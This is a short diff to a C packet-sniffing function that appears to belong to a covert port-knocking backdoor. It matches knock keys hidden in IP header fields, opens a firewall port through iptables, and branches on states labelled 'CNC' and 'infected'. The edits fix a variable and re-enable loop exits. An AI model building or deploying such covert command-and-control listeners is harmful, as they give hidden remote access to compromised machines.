@@ -87,15 +87,14 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         if(CheckKey(ip->ip_tos, ip->ip_id, true, false)){
             //port knocking packet
             const struct sniff_udp *udp;
-            const struct my_ip *ip;
-            int size_ip;
             int size_udp;
-            udp = (struct sniff_udp*)(packet + 14 + size_ip);
+            udp = (struct sniff_udp*)(packet + 14 + length);
             size_udp = 8;
             printf("Src port: %d\n", ntohs(udp->uh_sport));
             printf("Dst port: %d\n", ntohs(udp->uh_dport));
             for(int k = 0; k < Filter->amount; k++){
                 if(Filter->port_ushort[k] == udp->uh_sport){
+                    printf("");
                     Filter->pattern[k] = 1;
                 }
             }
@@ -106,7 +105,7 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
                 char *dip = Filter->targetip;
                 printf("WAITING FOR DATA\n");
                 iptables(Filter->targetip, "tcp", PORT, true, true);
-                //pcap_breakloop(interfaceinfo);
+                pcap_breakloop(interfaceinfo);
             }
         } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == false){
             //CNC
@@ -116,8 +115,8 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == true) {
             //infected
             //dont close
-            /*printf("EXIT LOOP");
-            pcap_breakloop(interfaceinfo);*/
+            printf("EXIT LOOP");
+            pcap_breakloop(interfaceinfo);
         } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'c' && Filter->infected == false){
             //CNC
             //
